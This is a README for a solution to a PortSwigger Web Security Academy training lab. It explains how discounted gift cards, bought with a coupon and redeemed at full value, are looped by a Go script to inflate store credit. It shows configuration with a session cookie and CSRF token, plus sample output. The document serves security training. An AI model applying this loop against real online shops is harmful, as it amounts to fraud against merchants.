# Lab: Infinite money logic flaw
DIFFICULTY: PRACTITIONER
LAB: Solved
TAG: infinite-money-logic-flaw

## Lab Description
This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

URL: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

## Solution

We take advantage of a logic flaw, where we can buy a gift card for $10 with a 30% discount (using a coupon `SIGNUP30`, paying only $7), and after we can redeem the gift card again for $10, so we get a profit of $3 per gift cards.

The script increases the amount of gift cards to buy **until the cap of 99** gift cards per purchase is reached, below you can find the evolution of the purchases and balance:
```
Store Credit Evolution:  [$100 $130 $169 $217 $280 $364 $472 $613 $796 $1033 $1330 $1627]
GiftCard Qty Evolution:  [10   13   16   21   28   36   47   61   79   99    99    ended]
```

## Usage

Before running don't forget to update the configuration variables on the beginning of the file.

Required conf:
```go
const (
	baseURL = "https://acb81f601fca3cc3809b0e5000d900a0.web-security-academy.net/" // your url for the lab
	csrf          = "LCEepui73UVEdHlN3R84TDYwCdfXc5cX"         // get this info from a POST request to /cart/coupon using Burp, or any browser
	cookie        = "session=ZrqCi4oh69dHpHLxSdUv072OJNOfw8Sf" // get this info from a POST request to /cart/coupon using Burp, or any browser
	targetBalance = 1337
)
```

To run just do:
```
go run main.go
```

Expected ouput:
```
$ go run main.go

==================================
==> Current Store Credit: $ 100
=> Buying 10 gift cards to redeem.
==================================

=== Request POST cart
status:  200 OK

=== Request POST cart/coupon
status:  200 OK

=== Request POST cart/checkout
status:  200 OK

=== Request POST gift-card | coupon: WEjfEKdqJu
status:  200 OK

...

Finished executing, current balance: $ 1627
```